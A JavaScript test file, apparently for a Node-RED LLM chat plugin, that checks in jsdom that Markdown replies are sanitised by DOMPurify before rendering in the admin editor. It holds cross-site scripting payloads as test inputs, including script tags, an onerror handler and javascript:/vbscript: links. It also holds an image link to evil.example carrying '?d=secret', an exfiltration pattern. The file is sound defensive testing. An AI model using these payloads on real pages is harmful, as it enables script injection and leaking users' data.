// A reply is rendered inside the editor, which holds admin privileges: what
// marked produces goes through DOMPurify, served to the plugin alone. Driven
// in a real DOM (jsdom) with the scripts the editor loads.
const fs = require('fs');
const path = require('path');
const { JSDOM } = require('jsdom');
const { ok, summary, ROOT, buildEditorMock } = require('./helpers.js');
const { createLLMPluginServer } = require(path.join(ROOT, 'src', 'server.js'));

const MODULES = ['src/common.js', 'src/core/canvas_layout.js', 'src/core/flow_converter_core.js',
  'src/core/llm_json_parser.js', 'src/chat_manager.js', 'src/importer.js', 'src/ui_core.js'];

function servedPurify() {
  const routes = {};
  createLLMPluginServer({
    settings: { userDir: null, get() {}, set: () => Promise.resolve() },
    log: { info() {}, warn() {}, error() {} },
    auth: { needsPermission: () => (req, res, next) => next && next() },
    httpAdmin: { get: (p, ...rest) => { routes[p] = rest[rest.length - 1]; }, post() {} },
  });
  let body = null;
  routes['/llm-plugin/vendor/purify.js']({}, {
    setHeader() {}, status() { return this; }, send(b) { body = b; },
  });
  return body;
}

function editor(withPurify) {
  const dom = new JSDOM('<!doctype html><body></body>', { runScripts: 'outside-only' });
  const w = dom.window;
  w.DOMPurify = 'the editor\'s own';
  w.eval(fs.readFileSync(path.join(path.dirname(require.resolve('marked/package.json')), 'lib', 'marked.umd.js'), 'utf8'));
  if (withPurify) w.eval(servedPurify());
  w.RED = buildEditorMock({ tabs: [{ id: 't1', type: 'tab', label: 'Flow 1' }], activeId: 't1' }).RED;
  MODULES.forEach((m) => w.eval(fs.readFileSync(path.join(ROOT, m), 'utf8')));
  return w;
}

function render(w, md) {
  const box = w.document.createElement('div');
  box.innerHTML = w.LLMPlugin.UI.formatMessage(md);
  return box;
}

console.log('A reply renders as Markdown, and nothing in it runs or loads');
const w = editor(true);
ok(w.DOMPurify === 'the editor\'s own', 'loading the plugin\'s DOMPurify leaves the editor\'s global alone');

const script = render(w, 'Hi <script>alert(1)</script> <img src=x onerror="alert(1)">');
ok(!script.querySelector('script') && !script.querySelector('img') && /alert\(1\)/.test(script.textContent),
  'raw HTML in a reply is shown as text (' + script.innerHTML.slice(0, 80) + ')');

['javascript:alert(1)', 'jav&#x61;script:alert(1)', 'JAVASCRIPT:alert(1)', 'data:text/html,<b>x</b>', 'vbscript:x'].forEach((href) => {
  const a = render(w, '[x](' + href + ')').querySelector('a');
  ok(!a || !a.getAttribute('href'), 'a link to ' + href + ' loses its href (' + (a && a.getAttribute('href')) + ')');
});

const link = render(w, '[docs](https://nodered.org/docs) and [mail](mailto:a@b.c) and [here](#top)').querySelectorAll('a');
ok(link.length === 3 && link[0].getAttribute('href') === 'https://nodered.org/docs' &&
   link[0].getAttribute('rel') === 'noopener noreferrer' && link[1].getAttribute('href') === 'mailto:a@b.c' &&
   link[2].getAttribute('href') === '#top',
  'http(s), mailto and relative links are kept, with rel="noopener noreferrer"');

const image = render(w, '![the flow](https://evil.example/x?d=secret)');
ok(!image.querySelector('img') && image.querySelector('a') &&
   image.querySelector('a').getAttribute('href') === 'https://evil.example/x?d=secret' && image.textContent.trim() === 'the flow',
  'an image becomes a link, so nothing is fetched until it is clicked');

const code = render(w, '```html\n<b onclick="x()">&gt;</b>\n```');
ok(code.querySelector('pre code') && code.querySelector('pre code').textContent.trim() === '<b onclick="x()">&gt;</b>' &&
   !code.querySelector('b'), 'a code block shows its HTML as written, entities included');

const rich = render(w, '# Title\n\n- **bold** and `code`\n\n| a | b |\n|---|---|\n| 1 | 2 |');
ok(rich.querySelector('h1') && rich.querySelector('li strong') && rich.querySelector('li code') && rich.querySelector('table td'),
  'headings, lists, emphasis, code and tables still render');

console.log('\nWithout DOMPurify, a reply is plain text');
const bare = editor(false);
const plain = render(bare, '**bold** <script>x</script>');
ok(!plain.querySelector('strong') && !plain.querySelector('script') && plain.textContent.indexOf('<script>') !== -1,
  'no Markdown, and nothing unescaped');

summary();
